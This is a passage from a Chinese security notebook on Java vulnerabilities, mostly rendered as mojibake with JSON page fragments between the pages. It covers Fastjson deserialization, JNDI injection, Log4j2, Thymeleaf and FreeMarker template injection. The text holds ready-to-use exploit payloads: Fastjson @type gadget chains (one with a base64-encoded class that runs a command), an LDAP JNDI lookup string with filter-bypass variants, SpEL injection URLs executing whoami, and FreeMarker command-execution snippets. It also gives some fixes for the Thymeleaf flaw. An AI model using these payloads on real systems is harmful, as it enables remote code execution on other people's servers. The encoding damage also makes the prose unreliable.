1.2.24ï¼šfastjsonåœ¨è§£æjsonçš„è¿‡ç¨‹ä¸­ï¼Œæ”¯æŒä½¿ç”¨autoTypeæ¥å®ä¾‹åŒ–æŸä¸€ä¸ªå…·ä½“çš„ç±»ï¼Œå¹¶è°ƒç”¨è¯¥ç±»çš„setter/getteræ–¹æ³•æ¥è®¿é—®å±æ€§ã€‚é€šè¿‡æŸ¥æ‰¾ä»£ç ä¸­ç›¸å…³çš„æ–¹æ³•ï¼Œå³å¯æ„é€ å‡ºä¸€äº›æ¶æ„åˆ©ç”¨é“¾ã€‚ 1.2.47ï¼šfastjsonäº1.2.24ç‰ˆæœ¬åå¢åŠ äº†ååºåˆ—åŒ–ç™½åå•ï¼Œè€Œåœ¨1.2.48ä»¥å‰çš„ç‰ˆæœ¬ä¸­ï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹æ®Šæ„é€ çš„jsonå­—ç¬¦ä¸²ç»•è¿‡ç™½åå•æ£€æµ‹ï¼ŒæˆåŠŸæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚ Userç±» public class User { private String name; private int id; public User(){ System.out.println(\"æ— å‚æ„é€ \"); } public User(String name, int id) { System.out.println(\"æœ‰å‚æ„é€ \"); this.name = name; this.id = id; } @Override public String toString() { return \"User{\" + \"name='\" + name + '\\'' + \", id=\" + id + '}'; } public String getName() { System.out.print(\"getName\"); return name; } public void setName(String name) { System.out.println(\"setName\"); this.name = name; } public int getId() { System.out.println(\"getId\"); return id; } public void setId(int id) { System.out.println(\"setId\"); this.id = id; } } åºåˆ—åŒ– JSON.toJSONString(class); User user = new User(\"lihua\",3); String json = JSON.toJSONString(user); System.out.println(json); åºåˆ—åŒ–æ—¶ä¼šè‡ªåŠ¨è°ƒç”¨Getteræ–¹æ³• User user = new User(\"lihua\",3); String json = JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(json); ä¼ å…¥SerializerFeature.WriteClassNameå¯ä»¥ä½¿å¾—Fastjsonæ”¯æŒè‡ªçœï¼Œå¼€å¯è‡ªçœååºåˆ—åŒ–æˆJSONçš„æ•°æ®å°±ä¼šå¤šä¸€ä¸ª@typeï¼Œè¿™ä¸ªæ˜¯ä»£è¡¨å¯¹è±¡ç±»å‹çš„JSONæ–‡æœ¬ã€‚ @type æŒ‡å®šç±»ï¼Œå…¶ä»–ä¸ºè¯¥ç±»Getteræ–¹æ³•è¿”å›çš„ç±»å±æ€§ ååºåˆ—åŒ– JSON.parse(json) JSON.parseObject(json,class) åªæœ‰åœ¨æŒ‡å®šæ˜¯å“ªä¸€ä¸ªç±»çš„å‰æä¸‹ ä½¿ç”¨JSON.parseååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„setæ–¹æ³• ä½¿ç”¨JSON.parseObjectååºåˆ—åŒ–ä¼šè°ƒç”¨æ­¤ç±»çš„getå’Œsetæ–¹æ³• å¦‚ä½•æŒ‡å®šä¸€ä¸ªç±» jsonä¸­ä½¿ç”¨@typeæŒ‡å®š String json = \"{\\\"@type\\\":\\\"User\\\",\\\"id\\\":3,\\\"name\\\":\\\"lihua\\\"}\"; parseObjectä¸­çš„ç¬¬äºŒä¸ªå‚æ•°æŒ‡å®š JSON.parseObject(json2, User.class) Payload JdbcRowSetImplé“¾ æœ¬è´¨æ˜¯JNDIæ³¨å…¥ï¼Œjdkç‰ˆæœ¬éœ€è¦æ»¡è¶³ 8u161 {\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://127.0.0.1:1389/g0tvin\",\"autoCommit\":true} setDataSourceNameæ–¹æ³•æŠŠä¼ è¿›å»çš„å€¼èµ‹ç»™dataSource setautoCommitæ–¹æ³•éœ€è¦ä¼ å…¥ä¸€ä¸ªå¸ƒå°”ç±»å‹çš„å‚æ•°ï¼Œè·Ÿè¿›connectæ–¹æ³•ï¼Œlookup(getDataSourceName()) lookupå‡½æ•°é“¾æ¥æˆ‘ä»¬å†™å…¥çš„æœåŠ¡ åŠ è½½æˆ‘ä»¬çš„æ¶æ„ç±» TemplatesImplé“¾ åŠ è½½javaå­—èŠ‚ç å¹¶å®ä¾‹åŒ–ï¼Œå¯ä»¥é€šè¿‡è¯¥é“¾æ³¨å…¥å†…å­˜é©¬ å±€é™æ€§ {\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\",\"_bytecodes\":[\"yv66vgAAADQAJAoAAwAPBwARBwASAQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEAEkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBAAR0ZXN0AQAMSW5uZXJDbGFzc2VzAQAiTGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0OwEAClNvdXJjZUZpbGUBAAxKREs3dTIxLmphdmEMAAQABQcAEwEAIGNvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMSR0ZXN0AQAQamF2YS9sYW5nL09iamVjdAEAG2NvbS9oZWxsby9kZW1vL2pzb24vSkRLN3UyMQEACDxjbGluaXQ+AQARamF2YS9sYW5nL1J1bnRpbWUHABUBAApnZXRSdW50aW1lAQAVKClMamF2YS9sYW5nL1J1bnRpbWU7DAAXABgKABYAGQEABGNhbGMIABsBAARleGVjAQAnKExqYXZhL2xhbmcvU3RyaW5nOylMamF2YS9sYW5nL1Byb2Nlc3M7DAAdAB4KABYAHwEAQGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9ydW50aW1lL0Fic3RyYWN0VHJhbnNsZXQHACEKACIADwAhAAIAIgAAAAAAAgABAAQABQABAAYAAAAvAAEAAQAAAAUqtwAjsQAAAAIABwAAAAYAAQAAACoACAAAAAwAAQAAAAUACQAMAAAACAAUAAUAAQAGAAAAFgACAAAAAAAKuAAaEhy2ACBXsQAAAAAAAgANAAAAAgAOAAsAAAAKAAEAAgAQAAoACQ==\"],'_name':'exp','_tfactory':{ },\"_outputProperties\":{ }} ç‰ˆæœ¬ Fastjsonåœ¨ä¸åŒç‰ˆæœ¬ä¸‹çš„åˆ©ç”¨æ–¹å¼å¾ˆä¸åŒï¼Œæ‰€ä»¥å­˜åœ¨Fastjsonæ¼æ´æ—¶ï¼Œé¦–è¦åˆ¤æ–­Fastjsonçš„ç‰ˆæœ¬ã€‚ 1.2.24 { \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"xxx://xxx/xx\", \"autoCommit\":true } } 1.2.25--1.2.47 { \"a\":{ \"@type\":\"java.lang.Class\", \"val\":\"com.sun.rowset.JdbcRowSetImpl\" }, \"b\":{ \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"xxx://xxx/xxx\", \"autoCommit\":true } } 1.2.48--1.2.68 1.2.80 ä¸å‡ºç½‘åˆ©ç”¨ TemplatesImplé“¾æ³¨å…¥å†…å­˜é©¬ï¼ŒTemplatesImplé“¾é™åˆ¶å¤šï¼Œä¸å®¹æ˜“é‡åˆ° Commons-io å†™æ–‡ä»¶/webshell ä½ç‰ˆæœ¬ é™åˆ¶ï¼šfastjson BECLæ”»å‡»ï¼Œå‘½ä»¤æ‰§è¡Œ/å†…å­˜é©¬ é™åˆ¶ï¼šJava 8u251ä»¥åï¼Œbcelç±»è¢«åˆ é™¤ C3P0ååºåˆ—åŒ– å‘½ä»¤æ‰§è¡Œç»“æœå†™åˆ°é™æ€ç›®å½•ä¸‹ æ¨èé˜…è¯» æ–°å§¿åŠ¿https://github.com/luelueking/CVE-2022-25845-In-Spring ç¬¬18ç¯‡ï¼šfastjsonååºåˆ—åŒ–æ¼æ´åŒºåˆ†ç‰ˆæœ¬å·çš„æ–¹æ³•æ€»ç»“ (qq.com) safe6Sec/Fastjson: Fastjsonå§¿åŠ¿æŠ€å·§é›†åˆ Fastjsonä¸å‡ºç½‘åˆ©ç”¨æ€»ç»“ - å…ˆçŸ¥ç¤¾åŒº (aliyun.com) Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 22:54:08 "},"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/JNDI.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/04.ååºåˆ—åŒ–/JNDI.html","title":"JNDIæ³¨å…¥","keywords":"","body":"ä»€ä¹ˆæ˜¯JNDI JNDI(Java Naming and Directory Interface)æ˜¯Javaæä¾›çš„Javaå‘½åå’Œç›®å½•æ¥å£ã€‚ Naming Service å‘½åæœåŠ¡ï¼šå‘½åæœåŠ¡å°†åç§°å’Œå¯¹è±¡è¿›è¡Œå…³è”ï¼Œæä¾›é€šè¿‡åç§°æ‰¾åˆ°å¯¹è±¡çš„æ“ä½œ Directory Serviceç›®å½•æœåŠ¡ï¼šç›®å½•æœåŠ¡æ˜¯å‘½åæœåŠ¡çš„æ‰©å±•ï¼Œé™¤äº†æä¾›åç§°å’Œå¯¹è±¡çš„å…³è”ï¼Œè¿˜å…è®¸å¯¹è±¡å…·æœ‰å±æ€§ã€‚ é€šè¿‡è°ƒç”¨JNDIçš„APIå¯ä»¥å®šä½èµ„æºå’Œå…¶ä»–ç¨‹åºå¯¹è±¡ã€‚ é€šè¿‡åç§°æŸ¥æ‰¾(lookup)å¯¹è±¡ é€šè¿‡å¯¹è±¡çš„å±æ€§æœç´¢(search)å¯¹è±¡ JNDIæ˜¯Java EEçš„é‡è¦éƒ¨åˆ†ï¼ŒJNDIå¯è®¿é—®çš„ç°æœ‰çš„ç›®å½•åŠæœåŠ¡æœ‰:JDBCã€LDAPã€RMIã€DNSã€NISã€CORBAï¼Œå¦‚ dns://domain ldap://ip/name rmi://ip/name ä»€ä¹ˆæ˜¯RMI RMIå…¨ç§°æ˜¯Remote Method Invocationï¼ˆè¿œç¨‹â½…æ³•è°ƒâ½¤ï¼‰ï¼Œç›®çš„æ˜¯ä¸ºäº†è®©ä¸¤ä¸ªéš”ç¦»çš„javaè™šæ‹Ÿæœºï¼Œå¦‚è™šæ‹ŸæœºAèƒ½å¤Ÿè°ƒç”¨åˆ°è™šæ‹ŸæœºBä¸­çš„å¯¹è±¡ï¼Œè€Œä¸”è¿™äº›è™šæ‹Ÿæœºå¯ä»¥ä¸å­˜åœ¨äºåŒä¸€å°ä¸»æœºä¸Šã€‚ RMIå…¶å‘é€ã€æ¥æ”¶çš„æ•°æ®éƒ½æ˜¯ååºåˆ—åŒ–æ•°æ®ã€‚ ä»€ä¹ˆæ˜¯LDAP LDAPï¼Œå…¨ç§°ä¸º Lightweight Directory Access Protocolï¼Œå³è½»é‡çº§ç›®å½•è®¿é—®åè®®ï¼Œä¸»è¦ç”¨äºèµ„æºæŸ¥è¯¢ã€‚ æ¼æ´å½¢æˆåŸå›  JNDIæ”¯æŒä»æŒ‡å®šçš„è¿œç¨‹æœåŠ¡å™¨ä¸Šä¸‹è½½classæ–‡ä»¶ï¼ŒåŠ è½½åˆ°æœ¬åœ°JVMä¸­ï¼Œå¹¶é€šè¿‡é€‚å½“çš„æ–¹å¼åˆ›å»ºå¯¹è±¡ã€‚ å¦‚æœç›®æ ‡åº”ç”¨è¿›è¡Œäº†JNDIæŸ¥è¯¢ï¼ˆlookupï¼‰ï¼Œå¹¶ä¸”å…¶æŸ¥è¯¢çš„åœ°å€æˆ–åç§°å¯æ§çš„è¯ï¼Œå°±ä¼šå½¢æˆJNDIæ³¨å…¥æ¼æ´ JNDIæ³¨å…¥ æµç¨‹ æ”»å‡»è€…æ„é€ æ¶æ„åè®®ï¼Œä¼ å…¥æœåŠ¡ç«¯ï¼ˆç›®æ ‡åº”ç”¨ï¼‰ rmi://ip:port/name ldap://ip:port/name dns://{å¤–å¸¦æ•°æ®}.åŸŸå æœåŠ¡ç«¯è¿æ¥åˆ°æ”»å‡»è€…æŒ‡å®šçš„æœåŠ¡ï¼ŒæŸ¥è¯¢å¾—åˆ°ä¸€ä¸ªæ¶æ„çš„JNDI Reference æœåŠ¡ç«¯è§£æè¯¥æ¶æ„JNDI Reference æ ¹æ®è§£æç»“æœåˆ°æŒ‡å®šæœåŠ¡å™¨ä¸Šä¸‹è½½Factoryçš„å­—èŠ‚ç  åŠ è½½å­—èŠ‚ç ï¼Œæ”»å‡»è€…çš„æ¶æ„ä»£ç è¢«æ‰§è¡Œ RMI ä½ç‰ˆæœ¬ æœåŠ¡ç«¯ RMIæœåŠ¡ Reference reference = new Reference(className,classFactor,classFactoryLocation) classNameï¼šè¿œç¨‹åŠ è½½æ—¶æ‰€ä½¿ç”¨çš„ç±»å classFactorï¼šåŠ è½½çš„ class ä¸­éœ€è¦å®ä¾‹åŒ–ç±»çš„åç§° classFactoryLocationï¼šæä¾›classesæ•°æ®çš„åœ°å€å¯ä»¥æ˜¯ file/ftp/http ç­‰åè®® å­˜æ”¾æ¶æ„å­—èŠ‚ç çš„WEBæœåŠ¡å™¨ æ¶æ„å­—èŠ‚ç å¯¹åº”çš„javaæ–‡ä»¶ å…ˆå¯åŠ¨RMIæœåŠ¡å’ŒwebæœåŠ¡å™¨ å†å¯åŠ¨Server é«˜ç‰ˆæœ¬ com.sun.jndi.rmi.object.trustURLCodebase é»˜è®¤ä¸º falseï¼Œæ‰€ä»¥ä¼šè¿›å…¥ if è¯­å¥ï¼ŒæŠ›å‡ºå¼‚å¸¸ã€‚ ç»•è¿‡ åŸç† ç»•è¿‡æŠ›å‡ºå¼‚å¸¸åè¿›å…¥javax.naming.spi.NamingManager å®ç° Tomcat Serverä¸­çš„BeanFactoryç±»ï¼Œé€šè¿‡è¯¥ç±»çš„getObjectInstanceæ–¹æ³•åå°„è°ƒç”¨äº†javax.el.ELProcessorçš„evalæ–¹æ³•ï¼Œæœ€ç»ˆå®ç°äº†ELè¡¨è¾¾å¼æ‰§è¡Œè¾¾åˆ°RCEçš„æ•ˆæœã€‚ LDAP ä½ç‰ˆæœ¬ åŒRMIï¼Œè¿œç¨‹åŠ è½½å³å¯ é«˜ç‰ˆæœ¬ å½“ä»LDAP Serverä¼ æ¥çš„å¯¹è±¡æ˜¯åºåˆ—åŒ–å¯¹è±¡æ—¶ï¼Œä¼šè°ƒç”¨readobjectæ–¹æ³•ï¼Œå­˜åœ¨ååºåˆ—åŒ–æ¼æ´ã€‚ ç‰ˆæœ¬å½±å“ com.sun.jndi.rmi.object.trustURLCodebase é»˜è®¤ä¸º false ç»•è¿‡æ–¹æ³• åˆ©ç”¨æœ¬åœ°Classä½œä¸ºReference Factory åˆ©ç”¨LDAPè¿”å›åºåˆ—åŒ–æ•°æ®ï¼Œè§¦å‘æœ¬åœ°Gadget Log4J2 åŸç† Log4jæ˜¯javaç”¨æ¥å¤„ç†æ—¥å¿—çš„ç¬¬ä¸‰æ–¹ç»„ä»¶ï¼Œæä¾›äº†Lookupsçš„æœºåˆ¶ï¼š ä¼šå¯¹æ—¥å¿—ä¸­ç”¨ ${prefix:key}åŒ…è£¹èµ·æ¥çš„å˜é‡è¿›è¡Œè§£æ å½“è®°å½•çš„ä¿¡æ¯ä¸º${jndi:xxx}æ—¶,log4j2å°±ä¼šå‘èµ·JNDI LookupæŸ¥è¯¢,ä»è€Œè§¦å‘JNDIæ³¨å…¥æ¼æ´ã€‚ åŸºæœ¬payload ?a=${jndi:ldap://xxxx/a} log4j2åŒ…å«çš„å˜é‡ https://github.com/bfengj/CTF/blob/main/Web/java/Log4j2/Log4j2-%E4%BF%A1%E6%81%AF%E6%B3%84%E9%9C%B2%E5%AD%A6%E4%B9%A0.md wafç»•è¿‡ å‡è®¾è¿‡æ»¤äº†å­—ç¬¦abc a${:-b}c ${lower:b} a${::-b}c a${E:-a}c a${:-${:-b}}c a${xxxanycodexxxx:-b}c unicodeç¼–ç ç»•è¿‡ æ’å…¥ç©ºç™½å­—ç¬¦ç»•è¿‡ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2024-12-24 22:54:18 "},"03.ä»£ç å®¡è®¡/JAVA/Java-Thymeleafæ¨¡æ¿æ³¨å…¥.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/Java-Thymeleafæ¨¡æ¿æ³¨å…¥.html","title":"Thymeleaf æ¨¡æ¿æ³¨å…¥","keywords":"","body":"Thymeleaf æ¨¡æ¿ä»‹ç» Thymeleaf æ˜¯ä¸€ä¸ªè·Ÿ Velocityã€FreeMarker ç±»ä¼¼çš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒå¯ä»¥å®Œå…¨æ›¿ä»£ JSP ã€‚ç›¸è¾ƒä¸å…¶ä»–çš„æ¨¡æ¿å¼•æ“ï¼Œå®ƒæœ‰å¦‚ä¸‹ä¸‰ä¸ªæå¸å¼•äººçš„ç‰¹ç‚¹ï¼š Thymeleaf åœ¨æœ‰ç½‘ç»œå’Œæ— ç½‘ç»œçš„ç¯å¢ƒä¸‹çš†å¯è¿è¡Œï¼Œå³å®ƒå¯ä»¥è®©ç¾å·¥åœ¨æµè§ˆå™¨æŸ¥çœ‹é¡µé¢çš„é™æ€æ•ˆæœï¼Œä¹Ÿå¯ä»¥è®©ç¨‹åºå‘˜åœ¨æœåŠ¡å™¨æŸ¥çœ‹å¸¦æ•°æ®çš„åŠ¨æ€é¡µé¢æ•ˆæœã€‚è¿™æ˜¯ç”±äºå®ƒæ”¯æŒ html åŸå‹ï¼Œç„¶ååœ¨ html æ ‡ç­¾é‡Œå¢åŠ é¢å¤–çš„å±æ€§æ¥è¾¾åˆ°æ¨¡æ¿+æ•°æ®çš„å±•ç¤ºæ–¹å¼ã€‚æµè§ˆå™¨è§£é‡Š html æ—¶ä¼šå¿½ç•¥æœªå®šä¹‰çš„æ ‡ç­¾å±æ€§ï¼Œæ‰€ä»¥ thymeleaf çš„æ¨¡æ¿å¯ä»¥é™æ€åœ°è¿è¡Œï¼›å½“æœ‰æ•°æ®è¿”å›åˆ°é¡µé¢æ—¶ï¼ŒThymeleaf æ ‡ç­¾ä¼šåŠ¨æ€åœ°æ›¿æ¢æ‰é™æ€å†…å®¹ï¼Œä½¿é¡µé¢åŠ¨æ€æ˜¾ç¤ºã€‚ Thymeleaf å¼€ç®±å³ç”¨çš„ç‰¹æ€§ã€‚å®ƒæä¾›æ ‡å‡†å’Œspringæ ‡å‡†ä¸¤ç§æ–¹è¨€ï¼Œå¯ä»¥ç›´æ¥å¥—ç”¨æ¨¡æ¿å®ç°JSTLã€ OGNLè¡¨è¾¾å¼æ•ˆæœï¼Œé¿å…æ¯å¤©å¥—æ¨¡æ¿ã€æ”¹jstlã€æ”¹æ ‡ç­¾çš„å›°æ‰°ã€‚åŒæ—¶å¼€å‘äººå‘˜ä¹Ÿå¯ä»¥æ‰©å±•å’Œåˆ›å»ºè‡ªå®šä¹‰çš„æ–¹è¨€ã€‚ Thymeleaf æä¾›springæ ‡å‡†æ–¹è¨€å’Œä¸€ä¸ªä¸ SpringMVC å®Œç¾é›†æˆçš„å¯é€‰æ¨¡å—ï¼Œå¯ä»¥å¿«é€Ÿçš„å®ç°è¡¨å•ç»‘å®šã€å±æ€§ç¼–è¾‘å™¨ã€å›½é™…åŒ–ç­‰åŠŸèƒ½ã€‚ Thymeleaf æ¨¡æ¿ä½¿ç”¨ ä¾èµ– org.springframework.boot spring-boot-starter-thymeleaf Controller @Controller public class welcomeController { ... @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } } ç›¸å…³è§£é‡Š @Controller ä¸€èˆ¬åº”ç”¨åœ¨æœ‰è¿”å›ç•Œé¢çš„åº”ç”¨åœºæ™¯ä¸‹.ä¾‹å¦‚ï¼Œç®¡ç†åå°ä½¿ç”¨äº† thymeleaf ä½œä¸ºæ¨¡æ¿å¼€å‘ï¼Œéœ€è¦ä»åå°ç›´æ¥è¿”å› Model å¯¹è±¡åˆ°å‰å°ï¼Œé‚£ä¹ˆè¿™æ—¶å€™å°±éœ€è¦ä½¿ç”¨ @Controller æ¥æ³¨è§£ã€‚ æ§åˆ¶å±‚å¤„ç†å®Œè¯·æ±‚ï¼Œè¿”å›è§†å›¾åç§°ï¼Œä»è€Œå¯¹åº”æ¨¡æ¿æ¥æ¸²æŸ“ç»“æœï¼Œæ¯”å¦‚ return \"welcome\"â†’resources/templates/welcome.html return \"/user/en/welcome\"â†’resources/templates/user.en/welcome.html æ¨¡æ¿æ”¾åœ¨resources/templatesä¸­ Spring Boot Web Thymeleaf Example meleaf Thymeleafæ¨¡ç‰ˆæ³¨å…¥å¤ç° Spring ThymeleafViewä¼šä½¿ç”¨è¡¨è¾¾å¼è§£ææ¨¡ç‰ˆåç§°ï¼Œè‹¥æ˜¯å°†ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ‹¼æ¥åˆ°æ¨¡ç‰ˆè·¯å¾„ä¸­ï¼Œå¯ä»¥é€ æˆè¡¨è¾¾å¼æ³¨å…¥ã€‚ Demoä»£ç veracode-research/spring-view-manipulation: When MVC magic turns black (github.com) @GetMapping(\"/path\") public String path(@RequestParam String lang) { return \"user/\" + lang + \"/welcome\"; //template path is tainted } payload /path?lang=__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"whoami\").getInputStream()).next()}__::.x å…¶ä¸­newäº†ä¸€ä¸ªjava.util.Scannerå¯¹è±¡ï¼Œç”¨äºè¯»å–å­—ç¬¦ã€‚ä¼ å…¥Scannerä¸­çš„å‚æ•°ä¸ºT(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream() T( )ç”¨äºè®¿é—®ç±»ä½œç”¨åŸŸçš„æ–¹æ³•å’Œå¸¸é‡ï¼Œè¿™å—æ˜¯å…³äºspelè¡¨è¾¾å¼çš„ java.util.Scanneræ˜¯å¯ä»¥çœç•¥çš„ï¼Œå®ƒåœ¨æ­¤ä»…ç”¨äºå›æ˜¾ï¼Œæ— éœ€å›æ˜¾æ—¶ç›´æ¥T(java.lang.Runtime).getRuntime().exec(\"id\")æ‰§è¡Œå‘½ä»¤å³å¯ã€‚ ::åœ¨æ­¤ä¸ºå¿…é¡»ï¼Œä¸ç„¶ä¸ä¼šè¿›å…¥è¡¨è¾¾å¼è§£æè¿‡ç¨‹ï¼Œå¹¶ä¸”ä¸€å®šå¾—åœ¨è¡¨è¾¾å¼åé¢ã€‚ .xåœ¨æ­¤å¤„å¯å¿½ç•¥ï¼ˆreturn \"user/\" + lang + \"/welcome\";ï¼‰ è§£æè·¯å¾„çš„ä»£ç åœ¨ThymeleafView:277ï¼Œå…¶ä¸­viewTemplateNameä¸­ä¸€å®šè¦åŒ…å«::ï¼Œä¸ç„¶ä¸ä¼šè¿›å…¥è¡¨è¾¾å¼è§£æè¿‡ç¨‹ã€‚ if (!viewTemplateName.contains(\"::\")) { // No fragment specified at the template name templateName = viewTemplateName; markupSelectors = null; } else { // Template name contains a fragment name, so we should parse it as such final IStandardExpressionParser parser = StandardExpressions.getExpressionParser(configuration); final FragmentExpression fragmentExpression; try { // By parsing it as a standard expression, we might profit from the expression cache fragmentExpression = (FragmentExpression) parser.parseExpression(context, \"~{\" + viewTemplateName + \"}\"); } catch (final TemplateProcessingException e) { throw new IllegalArgumentException(\"Invalid template name specification: '\" + viewTemplateName + \"'\"); } è·Ÿè¿›parser.parseExpressionæ–¹æ³•ï¼Œåœ¨StandardExpressionParserä¸­å¯¹~{viewTemplateName}~è¿›è¡Œå¤„ç† final String preprocessedInput = (preprocess? StandardExpressionPreprocessor.preprocess(context, input) : input); ç»§ç»­è·Ÿè¿›StandardExpressionPreprocessor.preprocessï¼Œåœ¨StandardExpressionPreprocessorä¸­ï¼Œä½¿ç”¨æ­£åˆ™è¡¨è¾¾å¼å°†è·¯å¾„ä¸­çš„è¡¨è¾¾å¼æå–å‡ºæ¥ã€‚å…¶ä¸­æ­£åˆ™è§„åˆ™ï¼š\\_\\_(.*?)\\_\\_ï¼ˆè¡¨ç¤ºéè´ªå©ªåŒ¹é…ä¸¤ä¸ª__ä¹‹é—´çš„å†…å®¹ï¼‰ï¼ŒåŒ¹é…å¾—åˆ°${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(\"id\").getInputStream()).next()} æå–è¡¨è¾¾å¼ä¹‹åå°±æ˜¯æ ¹æ®æ¡†æ¶è¿›è¡Œå¯¹åº”çš„è¡¨è¾¾å¼è§£æï¼Œè¿™é‡Œæ˜¯Springæ‰€ä»¥ç”¨çš„å°±æ˜¯SpringELè¡¨è¾¾å¼è§£æã€‚ @GetMapping(\"/doc/{document}\") public void getDocument(@PathVariable String document) { log.info(\"Retrieving \" + document); //returns void, so view name is taken from URI } @PathVariable å¤„ç†è¯·æ±‚ url è·¯å¾„ä¸­çš„å‚æ•° /user/{id} payload /doc/__$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22whoami%22).getInputStream()).next()%7d__::.x.x è¿™é‡Œè¦æ³¨æ„å¦‚æœè¦æœ‰å›æ˜¾çš„è¯ï¼Œéœ€è¦åœ¨æœ«å°¾å†åŠ ä¸Šä¸€ä¸ª.xï¼ŒåŸå› æ˜¯Springåˆ†é…URIæ—¶ä¼šè‡ªåŠ¨æŠ¹å»åç¼€åï¼Œå¯¼è‡´ç¼ºå°‘äº†.xï¼Œæ— æ³•æ­£å¸¸å›æ˜¾ã€‚å†åŠ ä¸€ä¸ª.xå°±èƒ½æ­£å¸¸å›æ˜¾ã€‚ æ¼æ´ä¿®å¤ é…ç½®ResponseBodyæˆ–RestControlleræ³¨è§£ @ResponseBodyæ³¨è§£å‘Šè¯‰springä¸å†è¿”å›è§†å›¾åç§°ï¼Œè€Œæ˜¯ç›´æ¥è¿”å›å€¼ @GetMapping(\"/safe/fragment\") @ResponseBody public String safeFragment(@RequestParam String section) { return \"welcome :: \" + section; //FP, as @ResponseBody annotation tells Spring to process the return values as body, instead of view name } é€šè¿‡redirect: æ ¹æ®springbootå®šä¹‰ï¼Œå¦‚æœåç§°ä»¥redirect:å¼€å¤´ï¼Œåˆ™ä¸å†è°ƒç”¨ThymeleafViewè§£æï¼Œè°ƒç”¨RedirectViewå»è§£æcontrollerçš„è¿”å›å€¼ @GetMapping(\"/safe/redirect\") public String redirect(@RequestParam String url) { return \"redirect:\" + url; //FP as redirects are not resolved as expressions } æ–¹æ³•å‚æ•°ä¸­è®¾ç½®HttpServletResponse å‚æ•° ç”±äºcontrollerçš„å‚æ•°è¢«è®¾ç½®ä¸ºHttpServletResponseï¼ŒSpringè®¤ä¸ºå®ƒå·²ç»å¤„ç†äº†HTTP Responseï¼Œå› æ­¤ä¸ä¼šå‘ç”Ÿè§†å›¾åç§°è§£æã€‚ è¿™é‡Œçš„å‰ææ¡ä»¶æ˜¯returnValueä¸ºç©ºï¼Œæ‰€ä»¥è¿™ç§ä¿®å¤æ–¹æ³•åªæœ‰åœ¨è¿”å›å€¼ä¸ºç©ºçš„æƒ…å†µä¸‹æ‰æœ‰æ•ˆã€‚ @GetMapping(\"/safe/doc/{document}\") public void getDocument(@PathVariable String document, HttpServletResponse response) { log.info(\"Retrieving \" + document); //FP } æ€»ç»“ è¿™ä¸ªæ¼æ´åŸç†å¾ˆç®€å•ï¼Œå°±æ˜¯Thymeleafçš„è§†å›¾å‚æ•°å¯è¿›è¡Œè¡¨è¾¾å¼è§£æï¼Œè‹¥ç”¨æˆ·è¾“å…¥å¯æ§åˆ¶è§†å›¾å‚æ•°ï¼Œå°±ä¼šå¯¼è‡´SpELæ³¨å…¥æ¼æ´äº§ç”Ÿã€‚ æ¼æ´ç»†èŠ‚ç‚¹æ˜¯payloadçš„æ„é€ ï¼Œéœ€è¦æ·»åŠ __å’Œ::å¼•å¯¼è¡¨è¾¾å¼è§£æã€‚ Copyright Â© Khaz 2024 all right reservedï¼Œpowered by Gitbookè¯¥æ–‡ç« ä¿®è®¢æ—¶é—´ï¼š 2023-10-29 16:54:07 "},"03.ä»£ç å®¡è®¡/JAVA/JavaAttack.html":{"url":"03.ä»£ç å®¡è®¡/JAVA/JavaAttack.html","title":"Java Attack","keywords":"","body":"ä»£ç æ‰§è¡Œ æ¨¡æ¿æ³¨å…¥SSTI FreeMarker FreeMarkeræ‹¥æœ‰è‡ªå·±çš„æ¨¡æ¿ç¼–å†™è§„åˆ™å¹¶ä½¿ç”¨FTLè¡¨ç¤ºï¼Œå³FreeMarkeræ¨¡æ¿è¯­è¨€ï¼Œæ¯”å¦‚:myweb.html.ftlå°±æ˜¯ä¸€ä¸ªFreeMarkeræ¨¡æ¿æ–‡ä»¶ Freemarkerå¯åˆ©ç”¨çš„ç‚¹åœ¨äºæ¨¡ç‰ˆè¯­æ³•æœ¬èº«ï¼Œç›´æ¥æ¸²æŸ“ç”¨æˆ·è¾“å…¥payloadä¼šè¢«è½¬ç è€Œå¤±æ•ˆï¼Œæ‰€ä»¥ä¸€èˆ¬çš„åˆ©ç”¨åœºæ™¯ä¸ºä¸Šä¼ æˆ–è€…ä¿®æ”¹æ¨¡ç‰ˆæ–‡ä»¶ poc å‘½ä»¤æ‰§è¡Œï¼š ${ex(\"open -a Calculator.app\"\")} ${value(\"java.lang.ProcessBuilder\",\"whoami\").start()} import os;os.system(\"calc.exe\") ${ ex(\"open -a Calculator.app\") } æ–‡ä»¶è¯»å–ï¼š FILE:[ ${byte}, ] FILE:[ ${byte}, ] FILE:[ ${byte}, ] 